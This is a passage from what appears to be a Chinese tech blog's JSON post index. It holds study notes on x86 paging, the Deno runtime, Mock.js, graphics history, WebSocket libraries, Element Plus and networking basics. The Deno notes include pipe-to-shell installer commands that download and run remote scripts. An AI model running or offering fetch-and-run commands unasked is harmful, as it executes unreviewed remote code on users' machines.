unit)基于页表来映射转换为物理地址\n在内存分页模式未出现之前，应用是直接访问物理内存的，应用具备读写全部物理内存的权限，因此可能会覆盖其他应用的数据，而80386架构出现，出现了保护模式，使用内存分页来通过特权级和进程地址空间来进行隔离\n进程地址空间隔离是通过进程独立性页表来完成的，每个进程实现的地址空间是不同的，避免影响到其他进程\n80386两级页表\n80386架构的线性地址为32位，因此可寻4GB大小的内存空间（4096），地址总线也是32位，因此也是只能寻找4gb大小的物理内存，而且分页机制也将每个物理内存的页面的大小设为4096字节\n一个页面大小为4096字节，地址总线为32位，因此一个页面可存储1024个物理页面地址，80386页表的第一页面是目录页面，物理内存地址存储在CR3寄存器中，可通过该目录页面来查找第二页面的1024个物理页面地址\nMMU将32位的线性地址，低12位是页内偏移，然后的低10位是页表的索引，最后的高10位是页面目录索引，页内偏移的取值范围为0到4095，页表索引和页面目录索引的取值范围为0到1023\n80386线性地址转换到物理地址的过程：先从CR3寄存器中获取页目录的物理地址，然后选择一个页表，在到页表索引中，找到页面的物理地址，最后通过页内偏移量来得到实质上的物理地址\nPAE三级页表\n80386架构的每个进程可使用4gb的线性地址空间，但是操作系统会将4gb的地址空间划分成用户空间和内核空间，为了解决内存空间不够使用，英特尔公司推出了物理地址扩展技术（PAE，PhysicalAddressExtension）\nPAE将地址总线扩展到36位，因此可寻找64gb的物理内存，但是线性地址依然是32位的，为了解决32位线性地址支持36位的物理地址映射，MMU页表映射机制进行了调整，一个页面只能存储512个地址\nPAE的32位线性地址是，高2位是页目录指针索引，后面9位是页目录索引，再后9位是页表索引，最后12位是页内偏移\nx64四级页表\n因为PAE技术并没有扩展线性空间，32位的地址宽度不够使用了，AMD公司基于x86架构扩展而出的x64架构，x64架构的寄存器宽度是64位的，但是线性地址只使用了48位，但是也足够了，因为可以寻高达256TB的内存空间地址，具体可寻多少物理内存空间，取决于地址总线的宽度\nx64架构，在PAE的基础上扩展了页表为4级，而且每个页面的大小是4096字节，高9位是页目录指针表，后9位是页目录指针，再后9位是页目录，然后9位是页表。最后12位是页内偏移量\n虚拟内存\n进程是以内存页面为单位向操作系统申请内存的，现代操作系统中会对申请的内存空间进行记录，并不会马上分配，而是等到该进程真正访问该内存空间是才会分配物理页面并且进行映射，然后恢复中断程序，如果进程访问了没有映射的内存空间，会被操作系统进行page fault处理，操作系统通过page failt handle进行检查内存空间分配记录\n物理空间不够分配时，操作系统可以将少使用的物理页面写入到磁盘交换分区（Swap分区）中，将空出来的页面给需要的进程使用，注意：当在磁盘交换分区中内存页面被访问了，也会触发page fault处理，操作系统通过page failt handle来将磁盘交换分区的内存页面加载回内存中","title":"汇编基础学习笔记"},{"content":"Deno是基于V8引擎，使用Rust构建的JavaScript \u0026amp; TypeScript 运行时环境，天生支持TypeScript，并且有安全模式（默认情况下无法获取网络，文件系统，环境变量等权限，当然也可以开放），Deno的作者是Nodejs之父Ryan Dahl，构建的原因是解决Nodejs的缺陷，例如模块的安全性（Node运行时的权限很高，缺乏模块的安全运行），Deno的模块化选择了ESMoule标准，而且具备浏览器的api，例如window全局变量，支持onload，onunload等事件函数，支持fetch，Web Workers等标准，异步操作返回采用Promise，支持await\nDeno不使用node_modules与package.json的包管理机制，而是采用下载编译的机制，并且存在缓存，模块更新通过更新缓存来完成\nDeno有个特殊的功能，就是可以从网络上导入模块\n安装\nLinux\ncurl -fsSL https://deno.land/install.sh | sh\n或者\nwindows\niwr https://deno.land/install.ps1 -useb | iex\n也可以通过scoop安装\nscoop install deno\n作为Rust构建的，当然也支持Cargo包管理器安装\ncargo install deno \u0026ndash;locked\n或者通过单一的可执行文件来安装（我采用这个方式，再配置一下Path环境变量就是可以了，windows选择deno-x86_64-pc-windows-msvc）\nhttps://github.com/denoland/deno/releases\n检查是否安装完成\ndeno \u0026ndash;version\n第一个例子\nimport DFetch from \u0026quot;https://deno.land/x/dfetch/mod.ts\u0026quot;\rDFetch.get(\u0026quot;https://xiaochenabc123.test.com\u0026quot;).then((response) =\u0026gt; {\rconsole.log(response)\r})\r运行\ndeno run .\\index.ts\n它会向你询问进行网络请求，是否允许，可通过\u0026ndash;allow-net默认运行，例如：deno run \u0026ndash;allow-net .\\index.ts\n第三方库通过https://deno.land/x查找\n权限\n\u0026ndash;allow-env，允许访问环境变量，可指定环境变量列表，通过逗号分隔\n\u0026ndash;allow-hrtime，允许高分辨率时间测量\n\u0026ndash;allow-net，允许网络访问，可指定网络地址列表，通过逗号分隔\n\u0026ndash;allow-ffi，允许加载动态库，动态库不是安全运行的\n\u0026ndash;allow-read，允许读取，可指定读取文件列表或者目录，使用逗号分隔\n\u0026ndash;allow-run，允许运行子进程，这个子进程不是安全运行的，可指定子进程列表，通过逗号分隔\n\u0026ndash;allow-write，允许写入，可指定写入文件列表或者目录，使用逗号分隔\n-A 或者 \u0026ndash;allow-all 允许全部权限\nVsCode插件deno\ndeno内置工具\n安装模块\ndeno install \u0026ndash;allow-net -n httpreq https://deno.land/x/dfetch/mod.ts\n卸载模块\ndeno uninstall httpreq\n格式化（支持js，ts，jsx，tsx，md，json等格式）\n格式化当前目录和子目录全部支持文件 deno fmt\n格式化指定文件 deno fmt 1.ts 2.ts\n格式化指定支持文件夹 deno fmt dist/\n检查是否已格式化 deno fmt \u0026ndash;check\n如果需要忽略格式化，只需要在文件头部设置注释// deno-fmt-ignore-file\n打包 deno bundle https://deno.land/x/dfetch/mod.ts httpreq.ts\n编译成执行文件（支持交叉编译，支持win64，macos64，macosarm，Linux64，通过\u0026ndash;target属性指定） deno compile \u0026ndash;allow-net \u0026ndash;target aarch64-apple-darwin index.ts\n支持的值有x86_64-unknown-linux-gnu, x86_64-pc-windows-msvc, x86_64-apple-darwin, aarch64-apple-darwin\n检查依赖关系\ndeno info .\\index.ts\n如果需要查看依赖缓存位置的信息，可以直接执行deno info命令来查看\n规范检查 deno lint .\\index.ts\n检查json deno lint \u0026ndash;json\n忽略规范检查请在文件头部设置注释，// deno-lint-ignore-file\n下载全部远程依赖项到本地文件夹中（会放到vendor文件下，其中import_map.json是依赖地址文件，deno.land文件夹是依赖项的存储文件夹，可以在deno.json下指定import_map.json或者deno run \u0026ndash;no-remote \u0026ndash;import-map=vendor/import_map.json index.ts来离线使用模块（也不使用模块））\ndeno vendor index.ts\n任务（deno.json）\n{\r\u0026quot;tasks\u0026quot;: {\r\u0026quot;run\u0026quot;: \u0026quot;deno run --allow-net index.ts \u0026quot;\r}\r}\r查看已定义任务 deno task\n执行指定任务 deno task run\n也可以指定任务的工作目录 deno task \u0026ndash;cwd .\\src run\n","permalink":"https://99999.fun/posts/161/","summary":"Deno是基于V8引擎，使用Rust构建的JavaScript \u0026amp; TypeScript 运行时环境，天生支持TypeScript，并且有安全模式（默认情况下无法获取网络，文件系统，环境变量等权限，当然也可以开放），Deno的作者是Nodejs之父Ryan Dahl，构建的原因是解决Nodejs的缺陷，例如模块的安全性（Node运行时的权限很高，缺乏模块的安全运行），Deno的模块化选择了ESMoule标准，而且具备浏览器的api，例如window全局变量，支持onload，onunload等事件函数，支持fetch，Web Workers等标准，异步操作返回采用Promise，支持await\nDeno不使用node_modules与package.json的包管理机制，而是采用下载编译的机制，并且存在缓存，模块更新通过更新缓存来完成\nDeno有个特殊的功能，就是可以从网络上导入模块\n安装\nLinux\ncurl -fsSL https://deno.land/install.sh | sh\n或者\nwindows\niwr https://deno.land/install.ps1 -useb | iex\n也可以通过scoop安装\nscoop install deno\n作为Rust构建的，当然也支持Cargo包管理器安装\ncargo install deno \u0026ndash;locked\n或者通过单一的可执行文件来安装（我采用这个方式，再配置一下Path环境变量就是可以了，windows选择deno-x86_64-pc-windows-msvc）\nhttps://github.com/denoland/deno/releases\n检查是否安装完成\ndeno \u0026ndash;version\n第一个例子\nimport DFetch from \u0026quot;https://deno.land/x/dfetch/mod.ts\u0026quot;\rDFetch.get(\u0026quot;https://xiaochenabc123.test.com\u0026quot;).then((response) =\u0026gt; {\rconsole.log(response)\r})\r运行\ndeno run .\\index.ts\n它会向你询问进行网络请求，是否允许，可通过\u0026ndash;allow-net默认运行，例如：deno run \u0026ndash;allow-net .\\index.ts\n第三方库通过https://deno.land/x查找\n权限\n\u0026ndash;allow-env，允许访问环境变量，可指定环境变量列表，通过逗号分隔\n\u0026ndash;allow-hrtime，允许高分辨率时间测量\n\u0026ndash;allow-net，允许网络访问，可指定网络地址列表，通过逗号分隔\n\u0026ndash;allow-ffi，允许加载动态库，动态库不是安全运行的\n\u0026ndash;allow-read，允许读取，可指定读取文件列表或者目录，使用逗号分隔\n\u0026ndash;allow-run，允许运行子进程，这个子进程不是安全运行的，可指定子进程列表，通过逗号分隔\n\u0026ndash;allow-write，允许写入，可指定写入文件列表或者目录，使用逗号分隔\n-A 或者 \u0026ndash;allow-all 允许全部权限\nVsCode插件deno\ndeno内置工具\n安装模块","title":"Deno js运行时环境学习笔记"},{"content":"Mock.js是模拟数据生成器，不需要后端来提供接口数据来进行开发，Mock可以根据数据模板生成随机数据，并且拦截Ajax请求返回模拟数据\n安装\nnpm install mockjs\n导入\nimport Mock from 'mockjs'\r通过传入数据模板对象生成数据\nconst data = Mock.mock({\r'list|10': [{\r\u0026quot;id|+1\u0026quot;: 1,\r\u0026quot;name\u0026quot;: \u0026quot;@cname\u0026quot;,\r\u0026quot;age|18-25\u0026quot;: 25\r}]\r})\rconsole.log(data)\r配置响应数据（当匹配url的ajax请求时，会根据数据模板生成模拟数据，并且作为响应返回，这里通过axios发送get请求）\nconst Data = Mock.mock('/api/name','get',{\rcode: 200,\rdata: {\r'list|10': [{\r\u0026quot;id|+1\u0026quot;: 1,\r\u0026quot;name\u0026quot;: \u0026quot;@cname\u0026quot;,\r\u0026quot;age|18-25\u0026quot;: 25\r}]\r}\r})\raxios.get('/api/name').then(\rres =\u0026gt; {\rconsole.log(res.data)\r}\r)\r也可以传入第二个参数，表示匹配的请求是哪个请求方法的\n记录数据模板\nconst Data = Mock.mock('/api/name',(options) =\u0026gt; {\rreturn {\rcode: 200,\roptions\r}\r})\raxios({method: 'get', url: '/api/name' , data: {'name':'chenjunlin'}}).then(\rres =\u0026gt; {\rconsole.log(res.data)\r}\r)\r配置拦截ajax请求时的行为，目前只有指定响应时间功能，单位毫秒\nMock.setup({\rtimeout: '200-500'\r})\r表示响应时间介于200到500毫秒之间，默认值为10-100\nMock.Random工具类，Random.extend扩展方法（扩展Mock.Random工具类的方法，也能扩展到Mock.mock数据模板）\nconst Random = Mock.Random\rconst data1 = Random.cname()\rconst data2 = Random.email()\rconsole.log(data1,data2)\rRandom.extend({\remailall: function(date){\rconst emailall = [\r'a@cjlio.com',\r'b@cjlio.com',\r'1@cjlio.com',\r'10001@qq.com',\r'123456@qq.com'\r]\rreturn this.pick(emailall)\r}\r})\rconst data3 = Mock.mock({\r'list|3': [{\r'email': '@EMAILALL'\r}]\r})\rconsole.log(data3)\r校验data数据是否符合数据模板\nconst template = {\r\u0026quot;id|+1\u0026quot;: 1,\r\u0026quot;name\u0026quot;: \u0026quot;@cname\u0026quot;,\r\u0026quot;age|18-25\u0026quot;: 25\r}\rconst data = {\rid: 1,\rname: '小陈',\rage: 20,\rpass: '123456'\r}\rconst abc = Mock.valid(template,data)\rconsole.log(abc)\r如果符合返回是空数组，如果不符合，会返回不符合在哪里，这个功能可以验证模拟数据和生产数据是否符合模型，避免模拟数据模型和生产数据模型不同，导致生产事故\n将Mock风格的模板转换为json\nconst template = {\r\u0026quot;id|+1\u0026quot;: 1,\r\u0026quot;name\u0026quot;: \u0026quot;@cname\u0026quot;,\r\u0026quot;age|18-25\u0026quot;: 25\r}\rconst abc = Mock.toJSONSchema(template)\rconsole.log(abc)\r详细使用方法请看Mockjs官方文档，https://github.com/nuysoft/Mock/wiki\n","permalink":"https://99999.fun/posts/160/","summary":"Mock.js是模拟数据生成器，不需要后端来提供接口数据来进行开发，Mock可以根据数据模板生成随机数据，并且拦截Ajax请求返回模拟数据\n安装\nnpm install mockjs\n导入\nimport Mock from 'mockjs'\r通过传入数据模板对象生成数据\nconst data = Mock.mock({\r'list|10': [{\r\u0026quot;id|+1\u0026quot;: 1,\r\u0026quot;name\u0026quot;: \u0026quot;@cname\u0026quot;,\r\u0026quot;age|18-25\u0026quot;: 25\r}]\r})\rconsole.log(data)\r配置响应数据（当匹配url的ajax请求时，会根据数据模板生成模拟数据，并且作为响应返回，这里通过axios发送get请求）\nconst Data = Mock.mock('/api/name','get',{\rcode: 200,\rdata: {\r'list|10': [{\r\u0026quot;id|+1\u0026quot;: 1,\r\u0026quot;name\u0026quot;: \u0026quot;@cname\u0026quot;,\r\u0026quot;age|18-25\u0026quot;: 25\r}]\r}\r})\raxios.get('/api/name').then(\rres =\u0026gt; {\rconsole.log(res.data)\r}\r)\r也可以传入第二个参数，表示匹配的请求是哪个请求方法的\n记录数据模板\nconst Data = Mock.mock('/api/name',(options) =\u0026gt; {\rreturn {\rcode: 200,\roptions\r}\r})\raxios({method: 'get', url: '/api/name' , data: {'name':'chenjunlin'}}).","title":"简单使用Mock.js模拟数据生成器"},{"content":"计算机图形学(Computer Graphics，CG)是研究图形表达，生成，处理与显示的学科\n通过数学算法将二维，三维图形转换成计算机显示器的栅格，例如向量，行列式，矩阵算法等等\n图形学历史\n1950年，MIT诞生第一个图形显示器（用于Whirlwind（旋风）电子管计算机显示图形），CRT显示器\nWhirlwind电子管计算机设计之初是美国空军训练飞行员，半自动地面防空系统（SAGE）\n应用CRT和光笔\n1958年，双人网球\n1960年，William Fetter（威廉﹒费特），创造‘计算机图形学’名词，计算机图形学先驱\n1961年，史帝夫﹒罗素（Steve Russell），spacewar游戏\n1962年，皮埃尔·贝塞尔（Pierre Bézier），贝塞尔曲线（Bézier curve），绘制曲线\n1962年，伊凡·苏泽兰（Ivan Sutherland），Sketchpad绘图应用，计算机图形学之父\n1963年，Force, Mass and Motion，https://techchannel.att.com/play-video.cfm/2012/8/20/AT\u0026amp;T-Archives-Force-Mass-Motion\n1968年，Ivan Sutherland创造“达摩克里斯之剑”头盔显示器\n1968年，Arthur Appel 提出光线投射算法\n1973年，Bui Tuong Phong，发明phong shading（Phong着色法）\n1974年，Speed Race游戏，第一款赛车游戏\n1977年，3D core Graphics System，图形学标准\n1980年，NEC µPD7220 GPU，支持1024*1024的显示，普及民用\n1996年，Krishnamurthy与Levoy提出法线贴图（Normal Mapping）\n1995年，Directx 1.0\n1997年，OpenGL 1.1\n1999年，Nvidia，Gefprce 256 GPU\n","permalink":"https://99999.fun/posts/159/","summary":"计算机图形学(Computer Graphics，CG)是研究图形表达，生成，处理与显示的学科\n通过数学算法将二维，三维图形转换成计算机显示器的栅格，例如向量，行列式，矩阵算法等等\n图形学历史\n1950年，MIT诞生第一个图形显示器（用于Whirlwind（旋风）电子管计算机显示图形），CRT显示器\nWhirlwind电子管计算机设计之初是美国空军训练飞行员，半自动地面防空系统（SAGE）\n应用CRT和光笔\n1958年，双人网球\n1960年，William Fetter（威廉﹒费特），创造‘计算机图形学’名词，计算机图形学先驱\n1961年，史帝夫﹒罗素（Steve Russell），spacewar游戏\n1962年，皮埃尔·贝塞尔（Pierre Bézier），贝塞尔曲线（Bézier curve），绘制曲线\n1962年，伊凡·苏泽兰（Ivan Sutherland），Sketchpad绘图应用，计算机图形学之父\n1963年，Force, Mass and Motion，https://techchannel.att.com/play-video.cfm/2012/8/20/AT\u0026amp;T-Archives-Force-Mass-Motion\n1968年，Ivan Sutherland创造“达摩克里斯之剑”头盔显示器\n1968年，Arthur Appel 提出光线投射算法\n1973年，Bui Tuong Phong，发明phong shading（Phong着色法）\n1974年，Speed Race游戏，第一款赛车游戏\n1977年，3D core Graphics System，图形学标准\n1980年，NEC µPD7220 GPU，支持1024*1024的显示，普及民用\n1996年，Krishnamurthy与Levoy提出法线贴图（Normal Mapping）\n1995年，Directx 1.0\n1997年，OpenGL 1.1\n1999年，Nvidia，Gefprce 256 GPU","title":"计算机图形学学习笔记"},{"content":"HTTP1.1协议实质上就是半双工信道，无法同时发送数据和接收数据，而且HTTP连接必须是客户端发起，由服务器来进行处理响应，只有HTTP2.0才是全双工信道（不需要等待响应，就可以发送第二个报文）\nWebSocket是全双工信道，而且还支持服务端主动发送数据给客户端，是服务器推送技术（还是需要客户端发起连接）\nWebSocket协议是应用层协议，而且是建立在TCP协议上，端口也是使用443和80，握手使用HTTP协议，浏览器不会限制WebSocket的同源\nWebSocket客户端配置\nWebSocket构造函数，用来创建WebSocket实例\nconst ws = new WebSocket(\u0026lsquo;ws://127.0.0.1\u0026rsquo;)\nWebSocket.readyState实例具备4种状态，该属性是只读的，用来表示连接WebSocket服务端的状态，分别是：0（正在连接），1（连接完成并且可以通信），2（连接正在关闭），3（连接已经关闭或者连接失败）\nWebSocket.onopen是指定连接成功后执行的回调函数\nWebSocket.onerror是指定连接失败后执行的回调函数\nWebSocket.onclose是指定连接关闭后执行的回调函数\nWebSocket.onmessage是指定从服务器获取信息时执行的回调函数\n可以指定WebSocket.binaryType来指定传输的数据类型，数据类型有2种，分别是blob和arraybuffer\n客户端配置例如：\nconst ws = new WebSocket('ws://localhost:8080')\rws.onopen = () =\u0026gt;{\rconsole.log(\u0026quot;连接中\u0026quot;)\rws.send('hallo word') // 向服务端发送数据\r}\rws.onerror = () =\u0026gt;{\rconsole.log('连接失败')\r}\rws.onmessage = (evt) =\u0026gt;{\rconsole.log('连接成功，正在获取数据')\rif(typeof evt.data === String){\rconsole.log('hallo'+evt.data)\r}else if(evt.data instanceof ArrayBuffer){\rlet data = evt.data\rconsole.log('数据：'+data)\r}\rws.close() // 手动关闭连接\r}\rws.onclose = () =\u0026gt;{\rconsole.log('连接已关闭')\r}\r还有WebSocket.bufferedAmount属性，也是只读，用于返回WebSocket..send没有发送到服务端的数据的字节数，为0表示全部数据已传输完毕\nWebSocket.url属性可以返回WebSocket实例的URL绝对路径，只读\nWebSocket.protocol属性可以返回服务端选中的子协议名字，只读\nWebSocket.extensions属性可以返回服务端已选择的扩展值，只读\nWebSocket服务端实现（node的ws模块）\n安装ws模块\nnpm install ws\nserver.js\nconst WebSocket = require('ws') // 导入模块\rconst WebSocketServer = WebSocket.Server\rconst wsmain =new WebSocketServer({\rport: 8080\r})\rwsmain.on('connection',function(ws){ console.log('客户端已连接')\rws.on('message',function(message){\rconsole.log(`客户端发送的数据:${message}`)\rws.send('欢迎连接该ws服务端')\rws.send(message)\r})\r})\rnode server.js\n这样服务端可以接收到客户端发送的数据，服务端也可以主动给连接中的客户端发送数据\n除了ws模块外，还有nodejs-websocket，Socket.IO，µWebSockets\nnodejs-websocket搭建服务端\n安装\nnpm install nodejs-websocket\nserver.js\nconst ws = require(\u0026quot;nodejs-websocket\u0026quot;)\rconst server = ws.createServer(function (ws) {\rws.on(\u0026quot;text\u0026quot;, function (str) {\rconsole.log(str)\rws.sendText('hallo word')\r})\rws.on(\u0026quot;close\u0026quot;, function (code, reason) {\rconsole.log(\u0026quot;客户端已经关闭连接\u0026quot;)\r})\r}).listen(8080)\rapp.js\nconst ws = new WebSocket('ws://localhost:8080')\rws.onopen = () =\u0026gt;{\rconsole.log(\u0026quot;连接中\u0026quot;)\rws.send('hallo word') // 向服务端发送数据\rconst obj = {\rname: 'root',\rage: 20,\rpass: '123456',\remail: 'a@xiaochenabc123.test.com',\rkey: 'hallo word'\r}\rconst data = JSON.stringify(obj)\rws.send(data) // 发送json数据\r}\rws.onerror = () =\u0026gt;{\rconsole.log('连接失败')\r}\rws.onmessage = (message) =\u0026gt;{\rconsole.log('连接成功，正在获取数据')\rconst isJson = (str) =\u0026gt; {\rtry{\rif(typeof JSON.parse(str) == 'object'){\rreturn true\r}\r}catch (e){\r}\rreturn false\r} if(isJson(message.data)){\rconsole.log(JSON.parse(message.data)) }else{\rconsole.log(message.data)\r}\r}\rws.onclose = () =\u0026gt;{\rconsole.log('连接已关闭')\r}\rSocket.io基于WebSocket协议，提供HTTP长轮询（当前客户端不支持WebSocket时）和自动重新连接（提供心跳机制，定期检查连接，连接断开时会进行重新连接操作），和ws模块不同的是，Socket.io提供客户端功能，实质上Socket.io使用的是WS模块提供的WebSocket服务（默认情况），也是可以使用µWebSockets.js提供的WebSocket服务\n服务端\nnpm install socket.io\nserver.js\nimport { Server } from 'socket.io'\rconst io = new Server(3000)\rio.on('connection', socket =\u0026gt; {\rconsole.log('已成功连接')\r// 服务端给客户端发送消息\rconsole.log('正在发送消息')\rsocket.emit('hallo','word')\rconsole.log('发送消息完成')\r// 服务端接收消息\rsocket.on('abc',(arg) =\u0026gt; {\rconsole.log(arg)\r})\rsocket.on('disconnect', () =\u0026gt; {\rconsole.log('连接已断开')\r})\r})\r客户端\nnpm install socket.io-client\nclient.js\nimport { io } from 'socket.io-client'\r// const socket = io()\rconst socket = io('ws://127.0.0.1:3000')\r// 客户端接收消息\rsocket.on('hallo',(arg) =\u0026gt;{\rconsole.log(arg)\r})\rsocket.emit('abc','xyz') ","permalink":"https://99999.fun/posts/158/","summary":"HTTP1.1协议实质上就是半双工信道，无法同时发送数据和接收数据，而且HTTP连接必须是客户端发起，由服务器来进行处理响应，只有HTTP2.0才是全双工信道（不需要等待响应，就可以发送第二个报文）\nWebSocket是全双工信道，而且还支持服务端主动发送数据给客户端，是服务器推送技术（还是需要客户端发起连接）\nWebSocket协议是应用层协议，而且是建立在TCP协议上，端口也是使用443和80，握手使用HTTP协议，浏览器不会限制WebSocket的同源\nWebSocket客户端配置\nWebSocket构造函数，用来创建WebSocket实例\nconst ws = new WebSocket(\u0026lsquo;ws://127.0.0.1\u0026rsquo;)\nWebSocket.readyState实例具备4种状态，该属性是只读的，用来表示连接WebSocket服务端的状态，分别是：0（正在连接），1（连接完成并且可以通信），2（连接正在关闭），3（连接已经关闭或者连接失败）\nWebSocket.onopen是指定连接成功后执行的回调函数\nWebSocket.onerror是指定连接失败后执行的回调函数\nWebSocket.onclose是指定连接关闭后执行的回调函数\nWebSocket.onmessage是指定从服务器获取信息时执行的回调函数\n可以指定WebSocket.binaryType来指定传输的数据类型，数据类型有2种，分别是blob和arraybuffer\n客户端配置例如：\nconst ws = new WebSocket('ws://localhost:8080')\rws.onopen = () =\u0026gt;{\rconsole.log(\u0026quot;连接中\u0026quot;)\rws.send('hallo word') // 向服务端发送数据\r}\rws.onerror = () =\u0026gt;{\rconsole.log('连接失败')\r}\rws.onmessage = (evt) =\u0026gt;{\rconsole.log('连接成功，正在获取数据')\rif(typeof evt.data === String){\rconsole.log('hallo'+evt.data)\r}else if(evt.data instanceof ArrayBuffer){\rlet data = evt.data\rconsole.log('数据：'+data)\r}\rws.close() // 手动关闭连接\r}\rws.onclose = () =\u0026gt;{\rconsole.log('连接已关闭')\r}\r还有WebSocket.bufferedAmount属性，也是只读，用于返回WebSocket..send没有发送到服务端的数据的字节数，为0表示全部数据已传输完毕\nWebSocket.url属性可以返回WebSocket实例的URL绝对路径，只读","title":"WebSocket学习笔记"},{"content":"Element Plus是基于vue3开发的组件库，而Element使用vue2开发的组件库\n安装Element Plus\nnpm install element-plus \u0026ndash;save\n或者\nyarn add element-plus\n导入Element Plus\nimport ElementPlus from 'element-plus'\rimport 'element-plus/dist/index.css'\r按需导入\n安装插件\nnpm install -D unplugin-vue-components unplugin-auto-import\n如果是使用Vite则配置vite.config.ts文件\n导入并且启用插件\nimport AutoImport from 'unplugin-auto-import/vite'\rimport Components from 'unplugin-vue-components/vite'\r...\rplugins: [\rAutoImport({\rresolvers: [ElementPlusResolver()],\r}),\rComponents({\rresolvers: [ElementPlusResolver()],\r}),\r],\r这个组件库还支持module导入的方式手动按需使用，例如：\n\u0026lt;template\u0026gt;\r\u0026lt;el-button\u0026gt;I am ElButton\u0026lt;/el-button\u0026gt;\r\u0026lt;/template\u0026gt;\r\u0026lt;script\u0026gt;\rimport { ElButton } from 'element-plus'\rexport default {\rcomponents: { ElButton },\r}\r\u0026lt;/script\u0026gt;\r","permalink":"https://99999.fun/posts/157/","summary":"Element Plus是基于vue3开发的组件库，而Element使用vue2开发的组件库\n安装Element Plus\nnpm install element-plus \u0026ndash;save\n或者\nyarn add element-plus\n导入Element Plus\nimport ElementPlus from 'element-plus'\rimport 'element-plus/dist/index.css'\r按需导入\n安装插件\nnpm install -D unplugin-vue-components unplugin-auto-import\n如果是使用Vite则配置vite.config.ts文件\n导入并且启用插件\nimport AutoImport from 'unplugin-auto-import/vite'\rimport Components from 'unplugin-vue-components/vite'\r...\rplugins: [\rAutoImport({\rresolvers: [ElementPlusResolver()],\r}),\rComponents({\rresolvers: [ElementPlusResolver()],\r}),\r],\r这个组件库还支持module导入的方式手动按需使用，例如：\n\u0026lt;template\u0026gt;\r\u0026lt;el-button\u0026gt;I am ElButton\u0026lt;/el-button\u0026gt;\r\u0026lt;/template\u0026gt;\r\u0026lt;script\u0026gt;\rimport { ElButton } from 'element-plus'\rexport default {\rcomponents: { ElButton },\r}\r\u0026lt;/script\u0026gt;\r","title":"简单使用Element Plus组件库"},{"content":"计算机网络是通用，可编程的硬件组成的，并且这些设备可互连，并且可以传输不同类型的数据\n计算机网络不是只有软件概念，还有硬件设备，例如：网卡，网线，路由器等等\n网络作用范围：广域网（WAN），城域网（MAN），局域网（LAN）\n计算机网络发展历史\nARPANET（1969年，美国国防部创建的单个网络）\n三层结构互联网（现代互联网雏形，当时主要用于连接美国学校，实验室的计算机，主干网，地区网，校园网）\n多层次ISP互联网（ISP指网络服务提供商（Internet Service Provider），常见网络服务提供商有中国移动，中国电信，中国联通等等）\n多层次ISP互联网，分主干ISP（主要跨国通信），地区ISP（主要局部地区通信，例如广东移动，北京电信等等）\n中国创建了多个公共互联网，例如：中国电信互联网（CHINANET），中国移动互联网（CMNET），中国联通互联网（UNINET），中国教育与科研计算机网（CERNET），中国科学技术网（CSTNET）等等\n计算机网络层次结构（确保数据通信顺通，识别目标计算机的状态，数据是否存在错误）\n层次结构大概分3个，网络应用，数据通信，物理网络\n层次细分的话，有七层，也就是OSI七层模型（OSI国际标准定义的），而且每个层都是独立的（不干预其他层），只完成不同的工作\nOSI七层模型：应用层（为计算机提供服务），表示层（数据处理），会话层（管理通信会话），传输层（管理通信连接），网络层（数据路由），数据链路层（管理节点之间的数据通信，例如传输数据到另一个局域网），物理层（计算机物理设备）\nOSI七层模型并没有成为广泛使用的标准，而是采用TCP/IP四层模型\nTCP/IP四层模型：应用层（对于OSI七层模型的应用，表示，会话，HTTP协议），传输层（OSI七层模型的传输层，TCP/UDP协议），（OSI七层模型的网络层，IP/ICMP协议）网络层，（数据链路层和物理层，ARP/RARP协议）网络接口层\n计算机网络性能指标\nbps=bit/s，1秒多少比特位，比特率\n时延：发送时延（数据bit除以bps），排队时延（数据等待被网络设备处理的时间），处理时延（数据到达目标机器后处理需要的时间），传输时延（传输路径除以bps）\n总时延 = 发送时延+排队时延+传输时延+处理时延\n往返时间RTT（Route-Trip Time）：数据报文在通信中来回一次的时间（可通过ping命令来查看RTT）\n物理层（连接不同的物理设备，传输比特流）\n物理层传输介质：双绞线（又分屏蔽和无屏蔽，区别就是增加了一层屏蔽层），同轴电缆，光纤（通过光传输，光纤内部是具有高折射率的纤芯，能折射光）\n电缆使用铜作为传输介质，光纤通过光来作为传输介质\n铜线中的电信号传播速度大约为2.3*10^8m/s\n光纤中光信号的传播速度是2.0*10^8m/s\n因此实质上电缆的传播速度比光纤快，因为光纤是利用光的反射来传输到远方的，实质光走的距离更长\n但是电缆的铜在远距离的情况下，会导致衰减（主要有2个原因导致，介质损耗（通过电磁波传导，会在介质中产生电场的电荷规则排序，这会消耗能量）和导线损耗），需要通过中继器来延续信号\n因此在跨市，跨城，跨省，跨国使用都是光纤（光纤的带宽比电缆好，也是一个原因），但是短距离，得益于电缆的传播速度，会更好，因此局域网内部大多使用电缆来传输（因为解析光信号，还需要个光信号调制调解器，计算机无法直接使用光纤传输的数据）\n比特流：通过高低电平来表示比特流，来传输数据\n信道（往一个方向传输信息的媒体，一个通信电路最少要有一个发送信道和接收信道）\n信道的分类：单工通信信道（只能往一个方向通信的信道，没有反馈的信道，例如电视机的电视闭路线），半双工通信信道（可以发送和接收信息，但是不能同时发送，同时接收），全双工通信信道（可以同时发送，同时接收）\n物理层会实现信道分用复用技术（提升信道的利用率）\n频分复用，时分复用，波分复用，码分复用\n数据链路层（封装成帧，透明传输，差错监测）\n数据帧：数据链路层中数据的基本单位，数据发送方会在网络层的一段数据的前后添加特定标记，而这一段数据就是数据帧，数据接收方根据特定标记来识别数据帧，是数据链路层内部数据处理成帧\n数据帧也分MAC帧（没有帧尾，因为MAC帧之间是96比特时间，帧头也是没有的，而是让物理层给MAC帧添加8bts的前导码），PPP帧（有帧头和帧尾，帧头到帧尾就是这个帧的长度）\n封装成帧：数据链路层会将网络层交付的数据报文添加帧头和帧尾，让其成为帧\n帧头和帧尾都是特定的控制字符（比特流），帧头（SOH）：00000001，帧尾（EOT）:00000100\n透明传输：数据链路层对网络层提供的数据没有限制（控制字符在帧数据中，但是不会去当成数据去处理，就好像帧头和帧尾不存在一样）\n字节填充（对数据内部的数据填充ESC转义字符），比特填充（零比特填充法：在每5个连续的1后面插入比特0）\n数据链路层规定了帧的数据的长度限制，就是最大传输单元MTU（Maximun Transfer 